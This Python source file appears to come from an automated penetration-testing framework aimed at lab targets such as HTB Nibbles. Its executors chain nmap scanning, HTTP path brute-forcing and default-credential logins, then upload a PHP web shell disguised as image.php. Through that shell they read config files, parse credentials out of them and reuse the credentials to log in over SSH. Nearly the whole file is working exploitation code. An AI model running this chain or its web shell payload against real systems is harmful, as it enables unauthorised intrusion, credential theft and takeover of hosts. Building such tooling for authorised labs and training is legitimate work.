"""Real subprocess-backed executors.

Each handler returns an `ExecutionResult` carrying `raw=<command output>`
so the eventual report can show *what was actually run*. Unimplemented
actions return error="not_implemented" so HybridExecutor can fall through
to the mock implementation while we incrementally fill these in.
"""

import re
import shutil
import socket
import subprocess

import paramiko
import requests

from core.actions import Action
from core.state import State
from executors.base import ExecutionResult
from knowledge import recipe_for


_NMAP_PORT_RE = re.compile(r"^(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?$", re.MULTILINE)


# credential extraction patterns — intentionally narrow. matches common
# config-file shapes; misses anything weird, which we want to fail loudly
# rather than guess.
_CRED_PATTERNS = [
    # key=value style:  user=foo / pass=bar  (and password=, username=)
    re.compile(
        r"(?:^|\s)(?:user(?:name)?)\s*[:=]\s*['\"]?(?P<user>[^\s'\";<>]+)",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:^|\s)(?:pass(?:word)?)\s*[:=]\s*['\"]?(?P<pwd>[^\s'\";<>]+)",
        re.IGNORECASE,
    ),
]
_PHP_USER_RE = re.compile(r"\$user\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
_PHP_PASS_RE = re.compile(r"\$pass\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)


def parse_creds_from_body(body: str, default_access: str = "ssh") -> list[dict]:
    """Pull (username, password) pairs out of a file body.

    Tries a few common shapes. Pairs are returned in order of first user found
    with the first password found — good enough for config files where they
    appear together.
    """
    if not body:
        return []

    users: list[str] = []
    passwords: list[str] = []

    for m in _PHP_USER_RE.finditer(body):
        users.append(m.group(1))
    for m in _PHP_PASS_RE.finditer(body):
        passwords.append(m.group(1))

    for m in _CRED_PATTERNS[0].finditer(body):
        users.append(m.group("user"))
    for m in _CRED_PATTERNS[1].finditer(body):
        passwords.append(m.group("pwd"))

    pairs = []
    for u, p in zip(users, passwords):
        pairs.append(
            {
                "username": u,
                "password": p,
                "access": default_access,
                "privilege": "user",
                "source": "loot_file",
                "confidence": "medium",
            }
        )
    return pairs


# Small directory-bust wordlist. Kept inline (rather than a separate file)
# so the executor has zero external data deps for now. Covers generic admin
# paths plus a few app-specific hints relevant to scenarios we plan to demo
# (e.g. /nibbleblog/ for HTB Nibbles).
DEFAULT_HTTP_WORDLIST = [
    "/",
    "/admin",
    "/admin.php",
    "/admin/",
    "/login",
    "/login.php",
    "/manage",
    "/manager",
    "/console",
    "/dashboard",
    "/wp-admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/uploads",
    "/uploads/",
    "/upload",
    "/files",
    "/backup",
    "/api",
    "/api/v1",
    "/test",
    "/dev",
    "/old",
    "/server-status",
    "/robots.txt",
    "/.git/HEAD",
    "/nibbleblog",
    "/nibbleblog/",
    "/nibbleblog/admin.php",
    "/nibbleblog/admin",
    "/nibbleblog/content",
    "/jenkins",
    "/jenkins/script",
    "/script",
    "/cgi-bin",
    "/index.php",
    "/index.html",
    "/config.php",
    "/.env",
]


def parse_nmap_services(output: str) -> tuple[list[int], dict[int, str]]:
    """Parse `nmap -sV` stdout into (ports, {port: service_name})."""
    ports: list[int] = []
    services: dict[int, str] = {}
    for match in _NMAP_PORT_RE.finditer(output):
        port = int(match.group(1))
        name = match.group(2)
        ports.append(port)
        services[port] = name
    return ports, services


class RealExecutor:
    def __init__(
        self,
        nmap_extra_args: list[str] | None = None,
        scan_timeout: int = 300,
        http_wordlist: list[str] | None = None,
        http_request_timeout: float = 3.0,
    ):
        self.nmap_extra = nmap_extra_args or []
        self.scan_timeout = scan_timeout
        self.http_wordlist = http_wordlist or DEFAULT_HTTP_WORDLIST
        self.http_request_timeout = http_request_timeout

    def execute(
        self, action: Action, state: State, scenario: dict
    ) -> ExecutionResult:
        handler = getattr(self, f"_do_{action.name}", None)
        if handler is None:
            return ExecutionResult(action, False, error="not_implemented")
        return handler(action, state, scenario)

    def _ip_for(self, scenario: dict, host_id: str) -> str | None:
        for h in scenario.get("hosts", []):
            if h["id"] == host_id:
                return h.get("ip")
        return None

    def _host(self, scenario: dict, host_id: str) -> dict | None:
        for h in scenario.get("hosts", []):
            if h["id"] == host_id:
                return h
        return None

    def _do_discover_host(self, action, state, scenario):
        ip = self._ip_for(scenario, action.target_host)
        if not ip:
            return ExecutionResult(action, False, error="host_unknown")
        if not shutil.which("nmap"):
            return ExecutionResult(
                action, False, error="not_implemented", raw="nmap not installed"
            )
        try:
            proc = subprocess.run(
                ["nmap", "-sn", "-PE", ip, *self.nmap_extra],
                capture_output=True,
                text=True,
                timeout=30,
            )
        except subprocess.TimeoutExpired:
            return ExecutionResult(action, False, error="discover_timeout")

        if "Host is up" not in proc.stdout:
            return ExecutionResult(
                action, False, error="host_unreachable", raw=proc.stdout
            )
        return ExecutionResult(
            action, True, observed={"host_alive": True}, raw=proc.stdout
        )

    def _do_scan_host(self, action, state, scenario):
        ip = self._ip_for(scenario, action.target_host)
        if not ip:
            return ExecutionResult(action, False, error="host_unknown")
        if not shutil.which("nmap"):
            return ExecutionResult(
                action, False, error="not_implemented", raw="nmap not installed"
            )
        try:
            proc = subprocess.run(
                [
                    "nmap",
                    "-sV",
                    "--top-ports",
                    "1000",
                    ip,
                    *self.nmap_extra,
                ],
                capture_output=True,
                text=True,
                timeout=self.scan_timeout,
            )
        except subprocess.TimeoutExpired:
            return ExecutionResult(action, False, error="scan_timeout")

        ports, services = parse_nmap_services(proc.stdout)
        if not ports:
            return ExecutionResult(
                action, False, error="scan_failed", raw=proc.stdout
            )
        return ExecutionResult(
            action,
            True,
            observed={"open_ports": ports, "services": services},
            raw=proc.stdout,
        )

    def _do_enumerate_http(self, action, state, scenario):
        ip = self._ip_for(scenario, action.target_host)
        if not ip:
            return ExecutionResult(action, False, error="host_unknown")

        port = action.target_port or 80
        base = f"http://{ip}:{port}"
        found: list[str] = []
        log_lines: list[str] = []

        for path in self.http_wordlist:
            url = f"{base}{path}"
            try:
                resp = requests.get(
                    url,
                    timeout=self.http_request_timeout,
                    allow_redirects=True,
                )
            except requests.RequestException as exc:
                log_lines.append(f"ERR  {url}  {exc.__class__.__name__}")
                continue

            log_lines.append(f"{resp.status_code:>3}  {url}")
            if resp.status_code != 404:
                found.append(path)

        if not found:
            return ExecutionResult(
                action, False, error="http_enum_failed", raw="\n".join(log_lines)
            )
        return ExecutionResult(
            action,
            True,
            observed={"paths": found},
            raw="\n".join(log_lines),
        )

    def _do_try_default_creds(self, action, state, scenario):
        host = self._host(scenario, action.target_host)
        if host is None:
            return ExecutionResult(action, False, error="host_unknown")

        recipe = recipe_for(host, state, "web_shell")
        if recipe is None or "default_credentials" not in recipe:
            return ExecutionResult(action, False, error="recipe_missing")

        ip = host.get("ip")
        port = action.target_port or 80
        base = f"http://{ip}:{port}"
        login_path = recipe.get("login_endpoint", "/login")
        user_key, pass_key = recipe.get("login_payload_keys", ("username", "password"))
        username, password = recipe["default_credentials"]
        success_indicator = recipe.get("login_success_indicator", "")

        sess = requests.Session()
        try:
            resp = sess.post(
                f"{base}{login_path}",
                data={user_key: username, pass_key: password},
                timeout=self.http_request_timeout,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            return ExecutionResult(
                action,
                False,
                error="default_creds_failed",
                raw=f"POST {login_path} {exc.__class__.__name__}",
            )

        body = resp.text or ""
        ok = (
            success_indicator in body
            if success_indicator
            else resp.status_code in (200, 302)
        )

        log = f"POST {login_path} -> {resp.status_code} ({len(body)} bytes)"

        if not ok:
            return ExecutionResult(
                action, False, error="default_creds_failed", raw=log
            )

        cred = {
            "username": username,
            "password": password,
            "access": "http",
            "privilege": "user",
            "source": f"default_credentials:{recipe['id']}",
            "confidence": "medium",
        }
        return ExecutionResult(
            action,
            True,
            observed={"creds": [cred]},
            raw=log,
        )

    def _do_exploit_upload(self, action, state, scenario):
        host = self._host(scenario, action.target_host)
        if host is None:
            return ExecutionResult(action, False, error="host_unknown")

        recipe = recipe_for(host, state, "web_shell")
        needed = ("login_endpoint", "upload_endpoint", "shell_path_after_upload")
        if recipe is None or any(k not in recipe for k in needed):
            return ExecutionResult(action, False, error="recipe_missing")

        http_cred = next(
            (c for c in state.creds_found if c.access == "http"), None
        )
        if http_cred is None:
            return ExecutionResult(action, False, error="no_http_creds")

        ip = host.get("ip")
        port = action.target_port or 80
        base = f"http://{ip}:{port}"
        login_path = recipe["login_endpoint"]
        upload_path = recipe["upload_endpoint"]
        shell_path = recipe["shell_path_after_upload"]
        upload_field = recipe.get("upload_field_name", "file")
        user_key, pass_key = recipe.get(
            "login_payload_keys", ("username", "password")
        )

        # tiny PHP shell. ?cmd=<command> runs the command and returns stdout.
        shell_payload = b"<?php system($_GET['cmd']); ?>"
        log_lines: list[str] = []

        sess = requests.Session()
        try:
            # 1. login
            login_resp = sess.post(
                f"{base}{login_path}",
                data={user_key: http_cred.username, pass_key: http_cred.password},
                timeout=self.http_request_timeout,
                allow_redirects=True,
            )
            log_lines.append(f"POST {login_path} -> {login_resp.status_code}")

            # 2. upload shell
            upload_resp = sess.post(
                f"{base}{upload_path}",
                files={upload_field: ("image.php", shell_payload, "image/png")},
                timeout=self.http_request_timeout,
                allow_redirects=True,
            )
            log_lines.append(f"POST {upload_path} -> {upload_resp.status_code}")

            # 3. verify shell works
            verify_url = f"{base}{shell_path}?cmd=id"
            verify_resp = sess.get(
                verify_url, timeout=self.http_request_timeout
            )
            log_lines.append(
                f"GET  {shell_path}?cmd=id -> {verify_resp.status_code} "
                f"({len(verify_resp.text)} bytes)"
            )
        except requests.RequestException as exc:
            log_lines.append(f"ERR {exc.__class__.__name__}")
            return ExecutionResult(
                action,
                False,
                error="upload_blocked",
                raw="\n".join(log_lines),
            )

        if "uid=" not in (verify_resp.text or ""):
            return ExecutionResult(
                action,
                False,
                error="shell_unreachable",
                raw="\n".join(log_lines),
            )

        return ExecutionResult(
            action,
            True,
            observed={"access_level": "web_shell"},
            artifacts={"shell_url": f"{base}{shell_path}"},
            raw="\n".join(log_lines),
        )

    def _do_read_sensitive_file(self, action, state, scenario):
        host = self._host(scenario, action.target_host)
        if host is None:
            return ExecutionResult(action, False, error="host_unknown")

        recipe = recipe_for(host, state, "file_access")
        if (
            recipe is None
            or "shell_path_after_upload" not in recipe
            or not recipe.get("loot_files")
        ):
            return ExecutionResult(action, False, error="recipe_missing")

        if state.access_levels.get(action.target_host) != "web_shell":
            return ExecutionResult(action, False, error="no_web_shell")

        ip = host.get("ip")
        port = action.target_port or 80
        shell_url = f"http://{ip}:{port}{recipe['shell_path_after_upload']}"
        loot_access = recipe.get("loot_creds_access", "ssh")

        all_creds: list[dict] = []
        log_lines: list[str] = []

        for path in recipe["loot_files"]:
            try:
                resp = requests.get(
                    shell_url,
                    params={"cmd": f"cat {path}"},
                    timeout=self.http_request_timeout,
                )
            except requests.RequestException as exc:
                log_lines.append(f"ERR cat {path}  {exc.__class__.__name__}")
                continue

            log_lines.append(
                f"GET cat {path} -> {resp.status_code} ({len(resp.text)} bytes)"
            )
            creds = parse_creds_from_body(resp.text, default_access=loot_access)
            if creds:
                all_creds.extend(creds)

        if not all_creds:
            return ExecutionResult(
                action,
                False,
                error="file_read_failed",
                raw="\n".join(log_lines),
            )

        return ExecutionResult(
            action,
            True,
            observed={"creds": all_creds},
            raw="\n".join(log_lines),
        )

    def _do_use_credentials_ssh(self, action, state, scenario):
        ip = self._ip_for(scenario, action.target_host)
        if not ip:
            return ExecutionResult(action, False, error="host_unknown")

        port = action.target_port or 22
        ssh_creds = [c for c in state.creds_found if c.access == "ssh"]
        if not ssh_creds:
            return ExecutionResult(action, False, error="no_ssh_creds")

        log_lines: list[str] = []

        for cred in ssh_creds:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    hostname=ip,
                    port=port,
                    username=cred.username,
                    password=cred.password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                )
                # quick sanity check that the session actually works
                _, stdout, _ = client.exec_command("whoami", timeout=5)
                whoami = stdout.read().decode().strip()
                client.close()

                if not whoami:
                    log_lines.append(f"OK auth {cred.username} but whoami empty")
                    continue

                log_lines.append(f"OK {cred.username} -> {whoami}")
                return ExecutionResult(
                    action,
                    True,
                    observed={"access_level": "ssh_user", "compromised": True},
                    artifacts={"ssh_user": whoami, "ssh_host": ip},
                    raw="\n".join(log_lines),
                )

            except paramiko.AuthenticationException:
                log_lines.append(f"FAIL auth {cred.username}")
            except (paramiko.SSHException, socket.error, socket.timeout) as exc:
                log_lines.append(f"ERR  {cred.username}  {exc.__class__.__name__}")
            finally:
                try:
                    client.close()
                except Exception:
                    pass

        return ExecutionResult(
            action,
            False,
            error="ssh_auth_failed",
            raw="\n".join(log_lines),
        )
